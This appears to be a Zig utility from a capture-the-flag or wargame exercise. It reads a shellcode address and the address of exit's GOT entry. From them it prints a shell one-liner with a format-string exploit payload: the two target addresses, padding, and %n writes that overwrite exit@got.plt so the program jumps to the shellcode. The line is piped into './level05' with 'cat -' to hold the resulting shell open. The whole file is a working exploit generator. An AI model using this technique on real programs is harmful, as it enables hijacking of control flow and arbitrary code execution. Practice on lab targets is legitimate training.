const std = @import("std");

fn readNumber(reader: std.fs.File) !u32 {
    var buf: [64]u8 = undefined;

    const len = try reader.read(&buf);
    if (len == buf.len) {
        return error.InputTooLarge;
    }

    var line = std.mem.trim(u8, buf[0..len], "\r\n ");
    if (std.mem.startsWith(u8, line, "0x")) {
        line = line[2..];
    }

    return std.fmt.parseUnsigned(u32, line, 16);
}

fn printaddr_python(writer: std.fs.File, addr: u32) !void {
    var a = addr;

    for (0..4) |_| {
        const b: u8 = @truncate(a);
        try writer.writer().print("\\x{x:0>2}", .{b});
        a = a >> 8;
    }
}

pub fn main() !void {
    const stdout = std.io.getStdOut();
    const stdin = std.io.getStdIn();

    try stdout.writeAll("SHELLCODE address: ");
    const shellcode_addr = try readNumber(stdin);

    try stdout.writeAll("`exit@got.plt` address: ");
    const exit_addr = try readNumber(stdin);

    try stdout.writeAll("(python -c \"print '");

    var writtenChars: u32 = 0;
    try printaddr_python(stdout, exit_addr);
    writtenChars += 4;
    try printaddr_python(stdout, exit_addr + 2);
    writtenChars += 4;

    const shellcode_part1: u32 = (shellcode_addr & 0xFFFF) - writtenChars;

    try stdout.writer().print("%{}x%10\\$n", .{shellcode_part1});
    writtenChars += shellcode_part1;

    std.debug.assert(writtenChars == shellcode_addr & 0xFFFF);

    const shellcode_part2: u32 = (shellcode_addr >> 16) - writtenChars;

    try stdout.writer().print("%{}x%11\\$n", .{shellcode_part2});
    writtenChars += shellcode_part2;

    std.debug.assert(writtenChars == shellcode_addr >> 16);

    try stdout.writeAll("'\" ; cat -) | ./level05\n");
}
